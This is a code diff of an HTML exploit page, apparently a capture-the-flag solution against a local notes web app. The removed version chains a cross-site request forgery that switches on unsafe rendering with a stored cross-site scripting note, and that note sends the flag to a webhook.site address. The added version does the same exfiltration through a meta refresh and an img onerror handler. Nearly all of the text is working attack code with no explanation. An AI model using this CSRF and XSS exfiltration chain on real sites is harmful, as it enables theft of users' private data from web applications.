@@ -1,35 +1,11 @@
-<!doctype html>
 <html>
-<body>
-<script>
-// helper: fire a POST without refreshing
-function post(path, params) {
-    const f = document.createElement('form');
-    f.method = 'POST';
-    f.action = path;
-    for (const [k,v] of Object.entries(params)) {
-        const i = document.createElement('input');
-        i.type='hidden'; i.name=k; i.value=v; f.appendChild(i);
-    }
-    document.body.appendChild(f);
-    f.submit();
-}
-
-// 1 – turn on “unsafe” rendering for every note
-post('http://127.0.0.1:7189/prefs/unsafe', {id: 1, enable: 1});
-
-// 2 – plant a malicious note (will become #2)
-const payload = `
-<script>
-fetch('/notes/1').then(r=>r.text()).then(t=>{
-  const m = t.match(/UMCS\\{[^}]+\\}/);
-  if (m) new Image().src='https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?flag='+encodeURIComponent(m[0]);
-});
-</script>`;
-post('http://127.0.0.1:7189/dashboard', {content: payload});
-
-// 3 – open the XSS note so the JS above runs
-setTimeout(()=>location='http://127.0.0.1:7189/notes/2', 1000);
-</script>
-</body>
+  <head>
+    <!-- Enable unsafe mode for note ID 1 -->
+    <meta http-equiv="refresh" content="0; url=http://127.0.0.1:7189/prefs/unsafe?id=1&enable=1" />
+  </head>
+  <body>
+    <!-- Extract note content and send to webhook -->
+    <img src="https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?flag=" 
+         onerror="this.src='https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?flag='+document.querySelector('.note-content').innerText" />
+  </body>
 </html>
